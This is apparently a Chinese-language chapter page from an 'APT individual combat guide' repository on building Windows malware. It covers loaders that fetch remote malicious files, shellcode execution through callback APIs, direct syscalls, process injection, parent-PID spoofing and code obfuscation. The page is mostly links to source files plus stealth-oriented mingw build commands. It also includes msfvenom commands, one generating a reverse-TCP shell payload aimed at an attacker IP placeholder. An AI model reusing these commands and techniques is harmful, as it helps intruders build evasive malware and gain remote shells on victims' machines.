## 加载器

### 下载远程恶意文件

[wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/wolf.cpp)

```bash
x86_64-w64-mingw32-g++ -shared -o wolf.dll wolf.cpp -fpermissive
```

[download.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/download.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 download.cpp -o download.exe -mconsole -lwininet -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
.\download.exe 进程PID
```

### Shellcode加载

1. EnumDesktopsA函数

```bash
msfvenom -p windows/x64/messagebox TEXT="Hello, World" -f c
```

[enumdesktopa.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/enumdesktopa.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 enumdesktopa.cpp -o enumdesktopa.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
````

2. EnumChildWindows函数

[ecw.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/ecw.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ecw.cpp -o ecw.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

3. Listplanting函数

[llcalc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/llcalc.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 llcalc.cpp -o llcalc.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

4. EnumerateLoadedModules函数

[elm.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/elm.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 elm.cpp -o elm.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp
```

## 系统调用

[sycall.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/sycall.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 sycall.cpp -o sycall.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 枚举进程并注入

### 单独枚举进程

[枚举进程.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/枚举进程.cpp)


### NtGetNextProcess函数

[ngnp.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/ngnp.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ngnp.cpp -o ngnp.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwap
```

### WTSEnumerateProcesses函数

[wtsep.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/wtsep.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 wtsep.cpp -o wtsep.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwap
```

## 父进程PID欺骗

### explorer进程

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f c
```

[exp.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%88%B6%E8%BF%9B%E7%A8%8BPID%E6%AC%BA%E9%AA%97/exp.cpp)

### 自定义父进程

[custom.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%88%B6%E8%BF%9B%E7%A8%8BPID%E6%AC%BA%E9%AA%97/custom.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 custom.cpp -o custom.exe -mwindows -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 互斥锁

[mutex.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BA%92%E6%96%A5%E9%94%81/mutex.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mutex.cpp -o mutex.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 代码混淆和加密

### 混淆技术

1.重命名

[script.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/script.py)

```bash
python script.py example.txt old new
```

2.控制流混淆

(1)条件控制流混淆

[number.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/number.py)

[tj.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/tj.py)

(2)控制流平坦化

[cff.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/cff.py)

[flatten.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/flatten.py)

```bash
python flatten.py cff.py
```

(3)不透明谓词

[example.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/example.py)

[op.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/op.py)
